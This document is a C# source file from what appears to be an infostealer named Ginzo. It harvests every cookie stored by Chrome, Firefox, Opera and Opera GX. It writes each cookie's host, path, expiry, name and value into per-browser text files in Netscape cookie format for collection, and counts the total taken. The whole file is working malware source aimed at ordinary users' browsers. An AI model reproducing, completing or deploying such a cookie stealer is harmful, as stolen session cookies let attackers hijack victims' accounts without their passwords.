using System;
using System.IO;
using System.Collections.Generic;
using Ginzo;
using Ginzo.Grabbers;

namespace Ginzo.Stealer.Browsers
{
    internal class Cookies
    {
        public static int ChromeCookiesCount = 0;
        public static int FirefoxCookiesCount = 0;
        public static int OperaCookiesCount = 0;
        public static int OperaGXCookiesCount = 0;
        public static void Chrome()
        {
            try
            {
                ChromeGrabber grabber = new ChromeGrabber(); // Define Grabber
                List<Chromium.Cookie> cookies = (List<Chromium.Cookie>)grabber.GetCookies(); // Collect all Cookies with GetCookies()

                // Print Hostname, Name and Value of every cookie:
                foreach (Chromium.Cookie cookie in cookies) // Since Chrome is a Chromium-based Browser it uses Chromium Cookies
                {
                    string cookieline = String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cookie.HostKey, cookie.Path, cookie.ExpiresUTC, cookie.Name, cookie.EncryptedValue);
                    File.AppendAllText(Preparing.CookiesPath + "\\Cookies_Chrome.txt", cookieline);
                    ChromeCookiesCount++;
                }
                Console.WriteLine("Chrome cookies: " + ChromeCookiesCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Chrome browser cookies");
            }
        }

        public static void Firefox()
        {
            try
            {
                FirefoxGrabber grabber = new FirefoxGrabber(); // Define Grabber
                List<Firefox.Cookie> cookies = (List<Firefox.Cookie>)grabber.GetCookies(); // Collect all Cookies with GetCookies()

                // Print Hostname, Name and Value of every cookie:
                foreach (Firefox.Cookie cookie in cookies) // Firefox has its own engine and therefore its own Cookie class (Firefox.Cookie)
                {
                    string cookieline = String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cookie.Host, cookie.Path, cookie.Expiry, cookie.Name, cookie.Value);
                    File.AppendAllText(Preparing.CookiesPath + "\\Cookies_Firefox.txt", cookieline);
                    FirefoxCookiesCount++;
                }
                Console.WriteLine("Firefox cookies: " + FirefoxCookiesCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Firefox browser cookies");
            }
        }

        public static void Opera()
        {
            try
            {
                OperaGrabber grabber = new OperaGrabber(); // Define Grabber
                List<Chromium.Cookie> cookies = (List<Chromium.Cookie>)grabber.GetCookies(); // Collect all Cookies with GetCookies()

                // Print Hostname, Name and Value of every cookie:
                foreach (Chromium.Cookie cookie in cookies) // Firefox has its own engine and therefore its own Cookie class (Firefox.Cookie)
                {
                    string cookieline = String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cookie.HostKey, cookie.Path, cookie.ExpiresUTC, cookie.Name, cookie.EncryptedValue);
                    File.AppendAllText(Preparing.CookiesPath + "\\Cookies_Opera.txt", cookieline);
                    OperaCookiesCount++;
                }
                Console.WriteLine("Opera cookies: " + OperaCookiesCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Opera browser cookies");
            }
        }

        public static void OperaGX()
        {
            try
            {
                OperaGxGrabber grabber = new OperaGxGrabber(); // Define Grabber
                List<Chromium.Cookie> cookies = (List<Chromium.Cookie>)grabber.GetCookies(); // Collect all Cookies with GetCookies()

                // Print Hostname, Name and Value of every cookie:
                foreach (Chromium.Cookie cookie in cookies) // Firefox has its own engine and therefore its own Cookie class (Firefox.Cookie)
                {
                    string cookieline = String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cookie.HostKey, cookie.Path, cookie.ExpiresUTC, cookie.Name, cookie.EncryptedValue);
                    File.AppendAllText(Preparing.CookiesPath + "\\Cookies_OperaGX.txt", cookieline);
                    OperaGXCookiesCount++;
                }
                Console.WriteLine("OperaGX cookies: " + OperaGXCookiesCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Opera GX browser cookies");
            }
        }

        public static int GetCookiesCount()
        {
            int allcookies = ChromeCookiesCount + FirefoxCookiesCount + OperaCookiesCount + OperaGXCookiesCount;
            return allcookies;
        }
    }
}
